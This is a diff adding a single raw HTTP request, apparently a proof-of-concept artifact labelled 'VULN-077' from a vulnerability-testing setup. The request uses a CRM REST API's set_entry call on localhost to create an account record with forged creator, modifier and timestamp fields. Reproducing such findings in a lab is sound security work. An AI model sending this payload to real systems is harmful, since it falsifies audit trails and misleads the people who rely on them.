@@ -1,0 +1,5 @@
+POST /service/v4_1/rest.php HTTP/1.1
+Host: localhost:33116
+Content-Type: application/x-www-form-urlencoded
+
+method=set_entry&input_type=JSON&response_type=JSON&rest_data=["33aa8bbcba1da824742f96ad6b0b61a6","Accounts",[{"name": "id", "value": "89caf3bf-0636-4a41-91b0-23d225bc16e4"}, {"name": "new_with_id", "value": "1"}, {"name": "name", "value": "Stage10 VULN-077 acct_077150ce"}, {"name": "set_created_by", "value": "0"}, {"name": "created_by", "value": "1"}, {"name": "update_modified_by", "value": "0"}, {"name": "modified_user_id", "value": "1"}, {"name": "update_date_modified", "value": "0"}, {"name": "date_modified", "value": "2000-01-01 00:00:00"}, {"name": "date_entered", "value": "2000-01-01 00:00:00"}]]
